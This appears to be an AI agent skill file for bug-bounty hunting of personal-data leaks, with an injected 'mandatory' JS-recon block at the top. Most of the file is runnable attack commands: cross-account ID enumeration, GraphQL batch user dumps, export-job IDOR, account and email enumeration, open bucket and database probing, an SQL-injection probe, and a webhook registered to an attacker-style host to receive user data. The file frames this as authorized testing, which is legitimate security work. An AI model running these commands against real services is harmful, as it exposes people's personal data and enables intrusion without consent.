---
name: pii-hunter
description: >
  Elite PII (Personally Identifiable Information) leak hunting skill for authorized bug bounty and pentests.
  ALWAYS activate for: mass PII exposure, data breach vectors, GDPR-reportable leaks, user data enumeration,
  unauth/cross-tenant PII read, API over-fetching, export/download PII bugs, search/autocomplete PII leaks,
  open datastores with user data, log/debug endpoints with PII, cache-based PII leaks, notification/webhook
  PII leaks, third-party analytics leaking PII, PDF/invoice generation exposing other users' data,
  "find PII leaks on target", "check for data exposure", "test for user data leaks", "GDPR bug", "privacy bug".
  Runs full PII kill chain: surface map → PII vector taxonomy → passive discovery → active probe →
  cross-tenant confirm → scale → validate → report. Includes separate 9-gate PII validation pipeline.
  Authorized testing only. Exfil cap: 1 record + count metadata. No bulk data extraction ever.
---

<!-- MANDATORY-JS-RECON-DOCTRINE v1 — injected across EVERY skill. Do not delete or gate behind a condition. -->

# 🚨 MANDATORY JS RECON GATE — NO SKIP, NO EXCEPTIONS

**This block is law in every skill.** Whatever else this skill does, if a web/HTTP target is
anywhere in scope you MUST complete the JS recon pipeline below BEFORE you conclude recon,
rank surface, declare "nothing found," or move to the next phase. Skipping any step is a
**process failure, not an optimization.** There is no file-count exception, no time-pressure
exception, no "it's a small app / SPA / static site" exception.

> Client-side JS is the attack-surface map of the entire application. Every bundle, chunk,
> worker, and source map leaks endpoints, secrets, roles, feature flags, and business logic
> the server never meant you to see. Hunters who skip JS lose the P1s.

---

## RULE 1 — The three crawlers are MANDATORY on EVERY live host

Run **all three** — never just one, never "pick your favourite." Enumerate subdomains first,
then run this per host (each subdomain can ship its own bundle, secrets, and logic):

```bash
subfinder -d "$T" -all -silent | httpx -silent -mc 200 -o live_hosts.txt   # per-host, not per-apex

# PASSIVE (zero-touch history — catches dead/forgotten/rotated-but-still-live JS)
echo "$HOST" | waybackurls | grep -iE '\.js(\?|$)' | anew js.txt
echo "$HOST" | gau --subs   | grep -iE '\.js(\?|$)' | anew js.txt   # gauplus --subs = same

# ACTIVE (live DOM, dynamic <script>, chunk loads)
katana   -u "https://$HOST" -jc -jsl -d 5 -silent | grep -iE '\.js(\?|$)' | anew js.txt
hakrawler -u "https://$HOST" -d 3 -subs 2>/dev/null | grep -iE '\.js'     | anew js.txt
gospider  -s "https://$HOST" -d 3 --js 2>/dev/null  | grep -oE 'https?://\S+\.js' | anew js.txt
```

**MANUAL CRAWL is equally mandatory — tools miss auth-gated and lazy-loaded routes:**
- Open the app in a real browser with Burp/mitmproxy inline. **Log in.**
- Click through **every** route, tab, modal, multi-step wizard, settings/admin area.
- Watch the Network panel: every `.js`, every XHR/fetch, every chunk pulled on navigation
  goes into `js.txt` / the endpoint list. SPAs load chunks lazily — a route you never
  visited = a bundle you never saw = bugs you never found.
- Toggle every feature you can and note the JS that loads behind each one.
- Burp extensions **JS Miner** + **Param Miner** run passively while you browse — enable both.

---

## RULE 2 — Recover, beautify, and READ every file (never grep-only)

```bash
sort -u js.txt -o js.txt && mkdir -p js_files beautified recovered
xargs -a js.txt -P20 -I@ sh -c 'curl -sL -A "Mozilla/5.0" "@" -o "js_files/$(echo @ | md5sum | cut -c1-16).js"'
for f in js_files/*.js; do js-beautify "$f" > "beautified/$(basename "$f")"; done

# SOURCE MAPS = full original source (readable, real var names, internal paths). A 200 is game over.
while read u; do curl -so /dev/null -w "%{http_code} $u.map\n" "$u.map"; done < js.txt | grep '^200'
sourcemapper -url "https://$HOST/static/main.js.map" -output ./recovered/   # or unwebpack / webcrack

# WEBPACK: pull the runtime bootstrap's chunk-id→hash map to enumerate LAZY chunks no crawler triggered
grep -oE '[0-9]+:"[0-9a-f]{6,}"' beautified/*runtime* 2>/dev/null | head -50
```

**Grep is a triage pass to prioritize — NEVER the analysis itself.** Every beautified/deobfuscated
file gets read end to end. No exception for hundreds of files across dozens of hosts.

---

## RULE 3 — Hunt these in every file (the money list)

Static-scan to triage, then READ to confirm. Scanners: `trufflehog filesystem js_files/`,
`jsluice urls|secrets js_files/*.js`, `mantra -f js.txt`, `SecretFinder -i <f> -o cli`,
`LinkFinder -i beautified/ -o cli`, `nuclei -t http/exposures/ -l js.txt`.

**For PII hunting specifically — hunt these patterns in every JS file:**
- **User data API endpoints** — `/api/users`, `/api/members`, `/api/profiles`, `/api/accounts`,
  `/api/customers`, `/api/admin/users`, `/api/v*/export`, `/api/v*/search?q=`
- **PII field names in API responses** — `email`, `phone`, `ssn`, `dob`, `address`, `fullName`,
  `firstName`, `lastName`, `nationalId`, `passport`, `driverLicense`, `medicalRecord`, `salary`
- **Export/download features** — `?format=csv`, `?export=true`, `downloadReport`, `bulkExport`
- **Admin endpoints** — `/admin/users`, `/dashboard/users`, `/internal/customers`
- **GraphQL queries with PII fields** — any query returning `email`, `phoneNumber`, `address`
- **Autocomplete/search endpoints** — `/api/search/users`, `/typeahead`, `/suggest`
- **Notification APIs** — endpoints sending emails/SMS that reflect user data in responses

---

## RULE 4 — Confirm dynamically, THEN it's a finding (kill false positives)

Nothing gets reported on a grep/static hit alone. Prove PII access live:
- **API endpoint** → hit it unauth + cross-tenant, confirm real user data in response
- **Export endpoint** → trigger export as User A, confirm it returns User B's records
- **Search/autocomplete** → query another user's email/phone, confirm match returned
- **GraphQL** → query PII fields cross-tenant with low-priv token
- **Cache** → hit `/account/profile` as User B after User A warmed the cache

**Exfil hard cap: 1 redacted record + count metadata. Never extract bulk data.**

---


# PII HUNTER — ELITE PII LEAK HUNTING SKILL

**Mission**: Find every vector where an attacker can read another user's Personally Identifiable
Information — unauthenticated or cross-tenant — and prove it with a single HTTP request a
triager runs in 60 seconds.

**Impact-first**: PII leaks land P1/P2 at GDPR-governed companies (EU regulatory exposure,
GDPR Article 83 fines up to 4% global annual revenue). Healthcare PII (HIPAA) and financial
PII (PCI-DSS, SOX) multiply impact. Scale matters — 1 record is Low, 10,000 records is Critical.

---

## PHASE 0 — SESSION START

Before touching a target, answer:

```
1. Target scope: [domains / APIs / mobile apps]
2. Auth status:  [unauth / low-priv user / admin (never start here)]
3. PII surface:  [consumer app / B2B SaaS / healthcare / fintech / marketplace]
4. Hunt angle:   [unauthenticated mass PII / cross-tenant IDOR / export abuse / API over-fetch]
5. Exfil cap:    Set reminder — 1 record + count. NEVER bulk extract.
```

**Create test accounts first** (if auth required):
```bash
# Use temp mail — automation is fine, never bypass captcha
MAIL=$(curl -s https://api.mail.tm/accounts -X POST \
  -H "Content-Type: application/json" \
  -d '{"address":"hunter'$(date +%s)'@aosod.com","password":"Hunter123!"}' | jq -r '.address')
echo "Test email: $MAIL"
```

---

## PHASE 1 — PII SURFACE MAPPING

Map every surface that could touch user data before probing anything.

### 1A — Subdomain + live host enumeration

```bash
T="target.com"
# Full subdomain sweep
subfinder -d "$T" -all -silent | anew subs.txt
amass enum -passive -d "$T" 2>/dev/null | anew subs.txt
curl -s "https://crt.sh/?q=%25.$T&output=json" | jq -r '.[].name_value' | \
  sed 's/\*\.//g' | sort -u | anew subs.txt

# Probe live
cat subs.txt | httpx -silent -status-code -title -tech-detect -o live.txt
cat live.txt | grep -v "404\|302" | grep -iE "api|app|admin|dashboard|portal|data|export|user"
```

### 1B — API surface discovery (PII-bearing APIs live here)

```bash
# Historical URLs — find old API paths before they were cleaned up
echo "$T" | gau --subs 2>/dev/null | grep -iE '/api/|/v[0-9]+/|/user|/member|/customer|/profile|/account' | \
  sort -u | anew api_endpoints.txt
echo "$T" | waybackurls | grep -iE 'export|download|csv|pdf|report|dump' | anew export_endpoints.txt

# Active API crawl with katana (catches auth-gated endpoints)
katana -u "https://$T" -jc -jsl -d 5 -silent | grep -iE '/api/|/graphql|/v[0-9]' | anew api_endpoints.txt

# Parameter discovery on API endpoints
cat api_endpoints.txt | head -20 | while read url; do
  arjun -u "$url" -oJ arjun_output.json 2>/dev/null
done
```

### 1C — OpenAPI / Swagger / GraphQL schema discovery

```bash
# Common API spec locations
for HOST in $(cat live.txt | awk '{print $1}'); do
  for path in /swagger.json /swagger/v1/swagger.json /api-docs /api/swagger.json \
              /openapi.json /api/openapi.json /docs/swagger.json /api/v1/swagger.json \
              /api/v2/swagger.json /api/schema/ /v1/api-docs /api/spec; do
    curl -so /dev/null -w "%{http_code} $HOST$path\n" "$HOST$path"
  done
done | grep '^200'

# GraphQL introspection
for HOST in $(cat live.txt | awk '{print $1}'); do
  for path in /graphql /api/graphql /graphql/v1 /v1/graphql /gql; do
    curl -s -X POST "$HOST$path" \
      -H "Content-Type: application/json" \
      -d '{"query":"{ __schema { types { name fields { name } } } }"}' 2>/dev/null | \
      python3 -c "import sys,json; d=json.load(sys.stdin); \
        [print(t['name'], [f['name'] for f in (t.get('fields') or [])]) \
         for t in d.get('data',{}).get('__schema',{}).get('types',[]) \
         if t.get('fields') and 'email' in str(t.get('fields',''))]" 2>/dev/null | \
      grep -v "^$" | head -20 | sed "s/^/$HOST$path: /"
  done
done
```

### 1D — PII surface classification

Once live hosts are enumerated, classify each by PII risk:

| Surface Type | PII Risk | Priority |
|---|---|---|
| User-facing API (REST/GraphQL) | Critical — direct data access | P0 |
| Admin dashboard / panel | Critical — mass PII access | P0 |
| Export / download / report endpoint | Critical — bulk PII | P0 |
| Search / autocomplete / typeahead | High — enumeration + PII | P1 |
| OAuth / SSO provider endpoints | High — identity data | P1 |
| Notification / email / SMS APIs | High — PII in transit | P1 |
| Third-party analytics / webhooks | Medium — indirect PII | P2 |
| Error / debug / logging endpoints | Medium — incidental PII | P2 |
| Static files (backups, exports) | Critical if user data present | P0 |
| Cloud storage (S3/GCS/Azure/Firebase) | Critical — bulk PII | P0 |

---

## PHASE 2 — PASSIVE PII DISCOVERY (ZERO-TOUCH)

Gather intelligence without touching the target. These steps are purely passive.

### 2A — Public source hunting

```bash
T="target.com"

# GitHub — source code + config leaks
gh search code "site:github.com $T" --json path,url 2>/dev/null | head -20
# Manual dorks:
# github.com search: "target.com" extension:env
# github.com search: "target.com" "email" filename:*.json
# github.com search: "api.target.com" "users" filename:*.py

# Google dorks for PII-exposing paths
# site:target.com ext:csv
# site:target.com ext:xlsx
# site:target.com inurl:export
# site:target.com inurl:download filetype:csv
# site:target.com "email" "phone" inurl:api
# cache:target.com/api/users
# "target.com" "ssn" OR "social security" OR "date of birth" site:pastebin.com

# Shodan for exposed datastores hosting PII
shodan search "hostname:$T port:9200" --fields ip_str,port,org | head -10   # Elasticsearch
shodan search "hostname:$T port:27017" --fields ip_str,port,org | head -10  # MongoDB
shodan search "hostname:$T port:6379"  --fields ip_str,port,org | head -10  # Redis
shodan search "hostname:$T port:5432"  --fields ip_str,port,org | head -10  # PostgreSQL
shodan search "hostname:$T port:3306"  --fields ip_str,port,org | head -10  # MySQL
shodan search "hostname:$T port:5984"  --fields ip_str,port,org | head -10  # CouchDB
```

### 2B — Historical data leak check

```bash
# Wayback machine — old API responses cached publicly
waybackurls "$T" | grep -iE '\.(json|csv|xml|xlsx|pdf|sql|bak)' | head -30

# Check if old cached pages show PII
curl -s "https://web.archive.org/web/20230101000000*/$T/api/users" 2>/dev/null | \
  python3 -c "import sys,json; d=json.load(sys.stdin); \
    [print(r.get('timestamp',''), r.get('original','')) for r in d.get('results',[])]" 2>/dev/null | head -10

# BreachDirectory / HaveIBeenPwned — is target already breached (inform scope/severity)?
# (Passive intel only — never use breach data to authenticate)
```

### 2C — JS file PII mapping (link to RULE 3 above)

After running the mandatory JS recon gate, grep the beautified JS for PII-related patterns:

```bash
# PII field names surfacing in API response schemas embedded in JS
grep -rihE '"(email|phone|mobile|ssn|dateOfBirth|dob|address|zip|national_id|passport|gender|salary|credit_card|card_number|cvv|iban|bic|medicalRecord|diagnosis|prescription)"' \
  beautified/ | sort -u | head -40

# API endpoint paths that suggest user data
grep -rihE '"(/api/|/v[0-9]+/).*?(users?|members?|customers?|profiles?|accounts?|employees?|patients?)"' \
  beautified/ | sort -u | head -30

# Export/download patterns
grep -rihE '"(export|download|csv|pdf|report|dump|backup)"' beautified/ | sort -u | head -20

# GraphQL queries with PII fields
grep -rihE 'query.*?(email|phone|address|fullName|ssn)' beautified/ | head -20
```

---

## PHASE 3 — PII VECTOR TAXONOMY (FULL KILL CHAIN)

Work through every class. Do NOT declare "nothing found" until each class is checked against
what your surface map revealed. Use the coverage ledger at the end to track completion.

---

### CLASS 1 — API Over-Fetching / Excessive Data Exposure (OWASP API3)

**What it is**: API returns more fields than the frontend uses. PII fields in response that
the UI doesn't display but are present in the JSON body.

**Why it pays**: Zero exploitation complexity — the data is just there in the response. P1/P2
depending on scale and sensitivity. GDPR violation. Triager can confirm in 10 seconds.

**Hunt vectors:**
```bash
# Baseline: what does the frontend request + what does the API return?
# Intercept with Burp: compare what the UI renders vs what's in the JSON

# Common over-fetch endpoints
for HOST in $(cat live.txt | awk '{print $1}'); do
  # /me / profile endpoint — often returns more than needed
  curl -s -H "Authorization: Bearer $TOKEN" "$HOST/api/me" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(list(d.keys()) if isinstance(d,dict) else 'array')" 2>/dev/null
  curl -s -H "Authorization: Bearer $TOKEN" "$HOST/api/profile" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(list(d.keys()) if isinstance(d,dict) else 'array')" 2>/dev/null
  curl -s -H "Authorization: Bearer $TOKEN" "$HOST/api/user" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(list(d.keys()) if isinstance(d,dict) else 'array')" 2>/dev/null
done

# List endpoints — /api/users returns all users with PII?
curl -s -H "Authorization: Bearer $LOW_PRIV_TOKEN" "$HOST/api/users" | python3 -c \
  "import sys,json; d=json.load(sys.stdin); \
   items = d if isinstance(d,list) else d.get('data',d.get('users',d.get('results',[])));
   print('COUNT:', len(items)); \
   print('FIELDS:', list(items[0].keys()) if items else 'empty')" 2>/dev/null
```

**PII field checklist to look for in every API response:**
```
email, emailAddress, email_address
phone, phoneNumber, phone_number, mobile, mobileNumber, cell
firstName, lastName, fullName, displayName, realName
dateOfBirth, dob, birthDate, age
address, streetAddress, city, state, zipCode, postalCode, country
ssn, socialSecurityNumber, nationalId, taxId, vatNumber
passportNumber, driverLicense, idNumber
salary, income, creditScore, financialInfo
creditCard, cardNumber, cvv, expiryDate, iban, bic, bankAccount
medicalRecord, diagnosis, prescription, insuranceId, healthPlan
ipAddress (if linked to identity), deviceId, browserId
```

**Escalation path:**
- 1 field returned → classify PII sensitivity (see Data Type Severity Matrix)
- Response includes 10+ users → mass exposure → P1
- Includes financial/health/SSN → Critical regardless of count

---

### CLASS 2 — IDOR → PII Read (Cross-Account)

**What it is**: Attacker substitutes their own resource ID with another user's ID to read
their PII. The authorization check is missing or is client-side only.

**Hunt vectors:**

```bash
# Setup: need 2 test accounts
ACCOUNT_A_TOKEN="..."   # User A token
ACCOUNT_B_ID="..."      # User B's user/profile/order ID

# Pattern: swap your own ID with another user's
# Source User B's ID from: response fields, URL slugs, invitation links, order confirmations

# Test every ID-bearing endpoint
for ENDPOINT in \
  "/api/users/$ACCOUNT_B_ID" \
  "/api/users/$ACCOUNT_B_ID/profile" \
  "/api/profiles/$ACCOUNT_B_ID" \
  "/api/accounts/$ACCOUNT_B_ID" \
  "/api/customers/$ACCOUNT_B_ID" \
  "/api/orders/$ACCOUNT_B_ID" \
  "/api/invoices/$ACCOUNT_B_ID"; do
  RESP=$(curl -s -w "\nHTTP:%{http_code}" -H "Authorization: Bearer $ACCOUNT_A_TOKEN" \
    "https://$HOST$ENDPOINT")
  CODE=$(echo "$RESP" | grep "HTTP:" | cut -d: -f2)
  if [[ "$CODE" == "200" ]]; then
    echo "[HIT] $ENDPOINT → HTTP $CODE"
    echo "$RESP" | head -5
  fi
done

# UUID enumeration — if IDs are UUIDs, find them from:
# 1. Invitation/share links
# 2. Public profile URLs
# 3. Referenced in your own account's response (team members, etc.)
# 4. Error messages that leak others' IDs
# 5. Order confirmation emails with other-tenant IDs

# Numeric ID enumeration — if IDs are sequential integers:
for ID in $(seq $((MY_ID - 5)) $((MY_ID + 5))); do
  [ "$ID" -eq "$MY_ID" ] && continue
  RESP=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $ACCOUNT_A_TOKEN" "https://$HOST/api/users/$ID")
  echo "ID=$ID HTTP=$RESP"
done
```

**IDOR PII severity escalation:**

| IDOR Access | PII Type | Severity |
|---|---|---|
| Read name + email | Contact PII | P3/Medium |
| Read phone + address | Contact + location PII | P2/High |
| Read SSN / passport / national ID | Government ID | P1/Critical |
| Read financial info (card, bank) | Financial PII | P1/Critical |
| Read medical record / diagnosis | Health PII | P1/Critical |
| Read salary / income | Financial PII | P2/High |
| Write / modify another user's PII | Data integrity | P1/Critical → ATO chain |
| Delete another user's account | Availability | P1/Critical |

---

### CLASS 3 — GraphQL → Mass PII Exposure

**What it is**: GraphQL enables attackers to query fields not exposed in the UI, fetch
nested objects with PII, or enumerate all users via list queries. Introspection reveals
the full data model.

**Hunt vectors:**

```bash
GRAPHQL_URL="https://$HOST/graphql"
HEADERS='-H "Content-Type: application/json" -H "Authorization: Bearer '$TOKEN'"'

# Step 1: Dump full schema
curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ __schema { types { name fields { name type { name kind } } } } }"}' | \
  python3 -c "
import sys,json
d=json.load(sys.stdin)
for t in d.get('data',{}).get('__schema',{}).get('types',[]):
    fields = t.get('fields') or []
    pii_fields = [f['name'] for f in fields if any(k in f['name'].lower() 
                  for k in ['email','phone','address','ssn','dob','name','passport','salary'])]
    if pii_fields:
        print(f\"[PII TYPE] {t['name']}: {pii_fields}\")
"

# Step 2: Query PII fields directly
curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ users { id email phone firstName lastName dateOfBirth address } }"}' | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d.get('data',{}), indent=2))"

# Step 3: Node interface — fetch any object by global ID (BOLA via GraphQL relay)
curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"query\":\"{ node(id: \\\"$OTHER_USER_GLOBAL_ID\\\") { ... on User { id email phone fullName } } }\"}"

# Step 4: Batch queries — enumerate 100 users in one request
BATCH_QUERY=$(python3 -c "
queries = [f'u{i}: user(id: \"{i}\") {{ id email fullName phone }}' for i in range(1,101)]
print('{\"query\":\"{ ' + ' '.join(queries) + ' }\"}')")
curl -s -X POST "$GRAPHQL_URL" -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" -d "$BATCH_QUERY" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); [print(v) for k,v in d.get('data',{}).items() if v]"

# Step 5: Mutation returning another user's data
curl -s -X POST "$GRAPHQL_URL" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"query\":\"mutation { updateUser(id: \\\"$OTHER_USER_ID\\\", input: {}) { id email fullName } }\"}"
```

---

### CLASS 4 — Export / Download / Report Endpoint Abuse

**What it is**: Data export features (CSV, PDF, Excel, ZIP) that either:
1. Export another user's data via IDOR on the export job ID
2. Export ALL users' data when a low-priv user triggers it
3. Don't invalidate export tokens, allowing replay

**Hunt vectors:**

```bash
# Step 1: Trigger an export as your own user, capture the response/job ID
curl -s -X POST "$HOST/api/export" \
  -H "Authorization: Bearer $MY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"format":"csv","scope":"all"}' | tee export_response.json

# Step 2: If async, poll for job ID
JOB_ID=$(cat export_response.json | python3 -c "import sys,json; print(json.load(sys.stdin).get('jobId',''))")
curl -s "$HOST/api/export/$JOB_ID/download" -H "Authorization: Bearer $MY_TOKEN"

# Step 3: IDOR — try another user's job ID (sequential or nearby UUID)
# Try job IDs from other sessions
curl -s "$HOST/api/export/$OTHER_JOB_ID/download" -H "Authorization: Bearer $MY_TOKEN"

# Step 4: What does the export contain?
# - Just my data? → check if scope param can be widened
# - All users? → mass PII, immediate P1
# - Other tenant data? → cross-tenant IDOR, P1

# Step 5: Unauthenticated export token replay
# Some export URLs are signed but long-lived — try accessing the download URL without auth
curl -s "$HOST/api/export/$JOB_ID/download?token=SIGNED_TOKEN_FROM_URL"

# Step 6: Format injection — does changing format expose more data?
for FORMAT in csv xlsx json xml pdf; do
  curl -s -X POST "$HOST/api/export" \
    -H "Authorization: Bearer $MY_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"format\":\"$FORMAT\",\"scope\":\"all\"}" | head -3
  echo "--- $FORMAT"
done

# Step 7: Admin export path — lower-priv user triggering admin export
curl -s -X POST "$HOST/api/admin/export/users" \
  -H "Authorization: Bearer $LOW_PRIV_TOKEN" | head -5
curl -s -X POST "$HOST/api/internal/reports/users" \
  -H "Authorization: Bearer $LOW_PRIV_TOKEN" | head -5
```

---

### CLASS 5 — Search / Autocomplete / Typeahead PII Enumeration

**What it is**: Search and autocomplete endpoints that return full PII records (not just the
display name) when querying a partial string. Attackers enumerate PII character-by-character.

**Hunt vectors:**

```bash
# Find all search/autocomplete endpoints from crawl
grep -hiE '/(search|autocomplete|typeahead|suggest|lookup|find|query)' api_endpoints.txt

# Test each: does it return PII beyond what's needed?
curl -s "$HOST/api/search/users?q=a" -H "Authorization: Bearer $TOKEN" | \
  python3 -c "import sys,json; d=json.load(sys.stdin); \
    items = d if isinstance(d,list) else d.get('results',d.get('data',[])); \
    print('FIELDS:', list(items[0].keys()) if items else 'empty'); \
    print('COUNT:', len(items))"

# Unauth search — does it work without a token?
curl -s "$HOST/api/search/users?q=admin"
curl -s "$HOST/api/users/search?email=test"
curl -s "$HOST/api/members/lookup?phone=555"

# Email enumeration — confirmation of PII existence
# "User with this email already exists" → confirms email is in database
curl -s -X POST "$HOST/api/signup" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com","password":"X"}' | grep -i "email\|exist\|taken\|already"

# Password reset PII enum
curl -s -X POST "$HOST/api/password-reset" \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}' | grep -i "email\|sent\|found\|account"

# Phone number enumeration
curl -s -X POST "$HOST/api/search" \
  -H "Content-Type: application/json" \
  -d '{"phone":"5551234567"}' | head -5
```

**Escalation**: email enumeration alone = Low/Info. Email enumeration + returns full profile
(name, phone, address) = High. Email enum + allows account-level action (password reset,
account merge) = Critical.

---

### CLASS 6 — Exposed Cloud Storage with PII (S3 / GCS / Azure / Firebase)

**What it is**: User-uploaded files (avatars, documents, invoices, exports) stored in
publicly-accessible cloud buckets, or Firebase/Firestore databases readable without auth.

**Hunt vectors:**

```bash
T="target.com"

# Step 1: Discover bucket names from JS, HTML, API responses
grep -rihE 's3\.amazonaws\.com|storage\.googleapis\.com|blob\.core\.windows\.net|firebaseio\.com' \
  beautified/ js_files/ | grep -oE 'https?://[^"'"'"' ]+' | sort -u | tee cloud_refs.txt

# Also check: company name variations as bucket names
for VARIANT in "$T" "${T%.*}" "${T%.*}-prod" "${T%.*}-backup" "${T%.*}-data" \
               "${T%.*}-export" "${T%.*}-users" "${T%.*}-uploads"; do
  aws s3 ls "s3://$VARIANT" 2>&1 | grep -v "NoSuchBucket\|AccessDenied"
  echo "---s3://$VARIANT"
done

# Step 2: S3 bucket permission tests
for BUCKET in $(cat cloud_refs.txt | grep -oE '[a-z0-9.-]+\.s3\.amazonaws\.com' | \
  sed 's/\.s3\.amazonaws\.com//' | sort -u); do
  echo "=== $BUCKET ==="
  aws s3 ls "s3://$BUCKET" --no-sign-request 2>&1 | head -5      # Public list?
  curl -s "https://$BUCKET.s3.amazonaws.com/?list-type=2" | \
    python3 -c "import sys; data=sys.stdin.read(); \
      print('LISTABLE' if '<Key>' in data else 'NOT-LISTABLE')"
done

# Step 3: GCS bucket tests
for BUCKET in $(cat cloud_refs.txt | grep -oE '[a-z0-9.-]+\.storage\.googleapis\.com' | \
  sed 's/\.storage\.googleapis\.com//' | sort -u); do
  curl -s "https://storage.googleapis.com/storage/v1/b/$BUCKET/o" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); \
      items=d.get('items',[]); \
      print(f'GCS BUCKET {\"$BUCKET\"}: {len(items)} objects listed')" 2>/dev/null
done

# Step 4: Firebase Realtime Database
for DB in $(cat cloud_refs.txt | grep 'firebaseio\.com' | grep -oE '[a-z0-9-]+\.firebaseio\.com' | sort -u); do
  curl -s "https://$DB/.json?shallow=true" | \
    python3 -c "import sys,json; d=json.load(sys.stdin); \
      print(f'FIREBASE {\"$DB\"}: {list(d.keys()) if isinstance(d,dict) else \"ACCESS DENIED\"}')" 2>/dev/null
  # Try user collection specifically
  curl -s "https://$DB/users.json?shallow=true" | head -3
done

# Step 5: Azure Blob Storage
for BLOB in $(cat cloud_refs.txt | grep 'blob\.core\.windows\.net' | \
  grep -oE '[a-z0-9-]+\.blob\.core\.windows\.net' | sort -u); do
  curl -s "https://$BLOB/?comp=list&restype=container" | grep -o '<Name>[^<]*</Name>' | head -5
done

# Step 6: Check if user-uploaded files are guessable
# Find upload path pattern from JS/API, then enumerate
# Pattern: /uploads/{user_id}/{filename} → try different user IDs
curl -s "https://$HOST/uploads/$ACCOUNT_B_ID/profile.jpg" -o /dev/null -w "%{http_code}"
```

---

### CLASS 7 — Open Datastores (Elasticsearch / MongoDB / Redis / CouchDB)

**What it is**: Production databases exposed to the internet without authentication,
containing user records, PII, logs with PII.

**Hunt vectors:**

```bash
# Get IP ranges from Shodan for the target org
SHODAN_IPS=$(shodan search "org:\"Target Corp\"" --fields ip_str | head -50)

# Elasticsearch (port 9200)
for IP in $(cat shodan_ips.txt); do
  # Check if accessible
  CODE=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 3 "http://$IP:9200/")
  if [[ "$CODE" == "200" ]]; then
    echo "[OPEN ES] http://$IP:9200/"
    # List indices
    curl -s "http://$IP:9200/_cat/indices?v" | grep -iE "user|customer|member|profile|order|log"
    # Sample 1 record from most promising index
    curl -s "http://$IP:9200/users/_search?size=1" | \
      python3 -c "import sys,json; d=json.load(sys.stdin); \
        hits=d.get('hits',{}).get('hits',[]); \
        print(list(hits[0]['_source'].keys()) if hits else 'empty')"
  fi
done

# MongoDB (port 27017)
for IP in $(cat shodan_ips.txt); do
  # mongostat to check open instances (passive)
  # Use mongosh only against confirmed test/sandbox instances
  timeout 3 bash -c "echo '' | nc -w 1 $IP 27017" 2>/dev/null && echo "[OPEN MONGO] $IP:27017"
done

# Redis (port 6379)
for IP in $(cat shodan_ips.txt); do
  RESP=$(timeout 2 redis-cli -h "$IP" -p 6379 PING 2>/dev/null)
  if [[ "$RESP" == "PONG" ]]; then
    echo "[OPEN REDIS] $IP:6379"
    # What keys look like PII?
    timeout 2 redis-cli -h "$IP" -p 6379 KEYS "*user*" 2>/dev/null | head -5
    timeout 2 redis-cli -h "$IP" -p 6379 KEYS "*session*" 2>/dev/null | head -5
  fi
done
```

**Exfil rule**: Confirm access with `_cat/indices` count + one sample record with fields
redacted. Do NOT dump. `GET /users/_count` → `{"count": 2847391}` is sufficient proof.

---

### CLASS 8 — Error / Debug / Log Endpoints Leaking PII

**What it is**: Misconfigured development artifacts, Spring Boot Actuator, debug endpoints,
server-side error pages that include PII in stack traces or response bodies.

**Hunt vectors:**

```bash
for HOST in $(cat live.txt | awk '{print $1}'); do
  # Spring Boot Actuator endpoints — often expose health/env/beans but also /heapdump
  for PATH in /actuator /actuator/health /actuator/env /actuator/configprops \
              /actuator/beans /actuator/mappings /actuator/heapdump /actuator/threaddump \
              /actuator/logfile /actuator/metrics /management/actuator /manage/actuator; do
    CODE=$(curl -so /dev/null -w "%{http_code}" "$HOST$PATH")
    [[ "$CODE" == "200" ]] && echo "[ACTUATOR] $HOST$PATH → $CODE"
  done

  # Debug / dev endpoints
  for PATH in /debug /api/debug /internal/debug /dev /api/dev \
              /__debug /admin/debug /debug/info /api/internal \
              /trace /api/trace /api/log /api/logs /logs \
              /_ah/admin /.well-known/security.txt; do
    CODE=$(curl -so /dev/null -w "%{http_code}" "$HOST$PATH")
    [[ "$CODE" == "200" ]] && echo "[DEBUG] $HOST$PATH → $CODE"
  done

  # Error page PII leak — send malformed requests and inspect error messages
  # Stack traces often include DB queries with literal user data
  curl -s "$HOST/api/users/INVALID_ID_$$" | grep -iE "email|phone|name|address" | head -3
  curl -s "$HOST/api/users/' OR 1=1 --" | grep -iE "email|phone|user" | head -3

  # Verbose error response on content-type mismatch
  curl -s -X POST "$HOST/api/users" \
    -H "Content-Type: text/plain" -d "test" | grep -iE "error|stack|query|user" | head -3
done
```

---

### CLASS 9 — Notification / Email / SMS API PII Leakage

**What it is**: Notification dispatch endpoints that return PII in the API response
(e.g., "email sent to victim@example.com" confirms email, or the notification preview
includes another user's PII).

**Hunt vectors:**

```bash
# Trigger a password reset / invite and inspect what the API returns
curl -s -X POST "$HOST/api/notifications/send" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"type":"password_reset","userId":"'"$OTHER_USER_ID"'"}' | head -10

# Does the notification API return the target user's email/phone?
curl -s -X POST "$HOST/api/invite" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}' | grep -iE "email|phone|name"

# Webhook PII — does registering a webhook cause PII to flow to an attacker-controlled URL?
# Register attacker webhook:
curl -s -X POST "$HOST/api/webhooks" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://attacker-collaborator.io/webhook","events":["user.created","user.updated"]}'

# Then trigger the event and check collaborator for PII in webhook payload

# Email preview / template endpoints
curl -s "$HOST/api/notifications/templates/password_reset/preview" \
  -H "Authorization: Bearer $TOKEN" | grep -iE "email|phone|name" | head -5
```

